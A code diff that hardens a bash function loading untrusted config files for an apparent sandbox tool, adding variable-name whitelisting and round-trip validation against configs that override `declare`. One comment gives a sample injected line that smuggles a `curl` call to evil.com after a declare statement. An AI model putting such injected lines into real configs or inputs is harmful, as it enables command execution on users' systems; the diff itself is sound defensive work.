@@ -216,12 +216,17 @@ _PROTECTED_SCALARS=(SANDBOX_BYPASS_TOKEN TOKEN_FILE)
 # Serializes current state into the child, sources the config, then extracts
 # only the known config variables via declare -p.
 #
-# This eliminates entire attack classes: function overrides, DEBUG traps,
-# exit/return, IFS manipulation, background processes, eval overrides —
-# none can escape the subprocess boundary.
+# This eliminates entire attack classes: DEBUG traps, exit/return, IFS
+# manipulation, background processes, eval overrides — none can escape
+# the subprocess boundary.
 #
-# The child's declare -p output is validated (only 'declare ' lines allowed)
-# before being eval'd in the parent.
+# The child's declare -p output is UNTRUSTED (the config could override
+# `declare` as a function) and undergoes three-layer validation before
+# being eval'd in the parent:
+#   1. Prefix check: every line must start with 'declare '.
+#   2. Name whitelist: the variable name must be in the allowed set.
+#   3. Round-trip: eval the output in a clean subprocess and re-serialize
+#      with the real declare -p — any injected payload causes a mismatch.
 _load_untrusted_config() {
     local _conf="$1"
     local _label="${2:-Config}"
@@ -243,24 +248,54 @@ _load_untrusted_config() {
 
     # Run config in isolated subprocess, extract only known variables.
     # The subprocess inherits nothing except the serialized state.
+    #
+    # SECURITY: After `. "$2"` runs untrusted code, any bash builtin name
+    # (declare, builtin, unset, command) could have been overridden as a
+    # shell function.  Calling `declare -p` would execute the attacker's
+    # function, whose output could pass a naive `^declare ` prefix check
+    # while injecting arbitrary commands into the eval in the parent.
+    #
+    # You cannot prevent function overrides inside the subprocess — even
+    # `builtin` itself can be overridden.  Therefore, the subprocess output
+    # is treated as UNTRUSTED, and the parent applies strict validation
+    # (see "Defence layers" below) before eval'ing it.
+    local _var_names
+    _var_names="$(printf '%s ' "${_CONFIG_ARRAYS[@]}" "${_CONFIG_SCALARS[@]}")"
+
     local _result _exit_code=0
     _result="$( /bin/bash --norc --noprofile -c '
         # Seed with parent state
         eval "$1"
         # Source the untrusted config
         . "$2" 2>/dev/null
-        # Extract only known config variables
-        declare -p '"$(printf '%s ' "${_CONFIG_ARRAYS[@]}" "${_CONFIG_SCALARS[@]}")"' 2>/dev/null
+        # Extract config variables.  If the config overrode declare as a
+        # function, this calls the attacker'\''s code — but the parent
+        # validates the output before eval'\''ing it (see below).
+        declare -p '"$_var_names"' 2>/dev/null
     ' -- "$_parent_state" "$_conf" )" || _exit_code=$?
 
     if [[ $_exit_code -ne 0 ]]; then
         echo "WARNING: ${_label} exited with code ${_exit_code} — using values it set before exiting." >&2
     fi
 
-    # Validate: only lines starting with 'declare ' are allowed.
-    # This prevents injected commands even if the subprocess's declare
-    # was overridden by the user config.
+    # --- Strict validation of subprocess output ---
+    #
+    # The subprocess output is UNTRUSTED because user config can override
+    # `declare` (and even `builtin`) as shell functions.  A malicious
+    # declare function could emit lines like:
+    #   declare -g -- SANDBOX_BACKEND="bwrap"; curl http://evil.com #"
+    # which starts with 'declare ' and would pass a prefix-only check.
+    #
+    # Defence layer 1: every line must start with 'declare '.
+    # Defence layer 2: variable name whitelist — each line's variable name
+    #   must be in _CONFIG_ARRAYS or _CONFIG_SCALARS.
+    # Defence layer 3: structural validation — each line must match the
+    #   EXACT format that real `declare -p` produces, with no trailing
+    #   content after the value.  We parse line-by-line in the parent
+    #   (which has clean builtins) and reject anything that doesn't
+    #   round-trip cleanly through declare -p.
     if [[ -n "$_result" ]]; then
+        # Layer 1: prefix check (fast reject of obvious garbage).
         local _bad_lines
         _bad_lines="$(echo "$_result" | grep -cvE '^declare ' || true)"
         if [[ "$_bad_lines" -gt 0 ]]; then
@@ -268,6 +303,53 @@ _load_untrusted_config() {
             echo "  File: $_conf" >&2
             return 1
         fi
+
+        # Layer 2: variable name whitelist.
+        # Build alternation of allowed names.
+        local _allowed_re
+        _allowed_re="$(printf '%s|' "${_CONFIG_ARRAYS[@]}" "${_CONFIG_SCALARS[@]}")"
+        _allowed_re="${_allowed_re%|}"  # strip trailing |
+
+        # Real declare -p output forms (bash 4.4+):
+        #   declare -- VAR="value"
+        #   declare -a VAR=([0]="v1" [1]="v2")
+        #   declare -A VAR=([k]="v")
+        #   declare -x VAR="value"
+        #   declare -ar VAR=([0]="v1")
+        # The flags field is a single group of letters after '-'.
+        # '--' appears for untyped variables.
+        local _name_bad
+        _name_bad="$(echo "$_result" | grep -cvE "^declare (-[aAxir-]+ )*(-- )?($_allowed_re)=" || true)"
+        if [[ "$_name_bad" -gt 0 ]]; then
+            echo "FATAL: ${_label} declared unexpected variable names — refusing to load." >&2
+            echo "  File: $_conf" >&2
+            return 1
+        fi
+
+        # Layer 3: round-trip validation.
+        # Eval each line in a CLEAN subprocess, then re-serialize with the
+        # real declare -p.  If the re-serialized output differs from the
+        # input, the line contained injected content (e.g., embedded
+        # commands after the value that execute during eval but don't
+        # appear in the re-serialized form).
+        #
+        # This is the strongest defence: even if an attacker crafts a line
+        # that passes the prefix and name checks, any side-effect payload
+        # (command substitution, ;-separated commands, etc.) will execute
+        # in this isolated validation subprocess (not the parent) and will
+        # NOT appear in the re-serialized output, causing a mismatch.
+        local _roundtrip
+        _roundtrip="$( /bin/bash --norc --noprofile -c '
+            eval "$1"
+            declare -p '"$_var_names"' 2>/dev/null
+        ' -- "$_result" )" || true
+
+        if [[ "$_roundtrip" != "$_result" ]]; then
+            echo "FATAL: ${_label} output failed round-trip validation — refusing to load." >&2
+            echo "  File: $_conf" >&2
+            return 1
+        fi
+
         # Apply extracted values to GLOBAL scope.
         # declare -p output produces 'declare -a VAR=(...)' for arrays and
         # 'declare -- VAR="..."' for scalars. Plain 'declare' inside a function
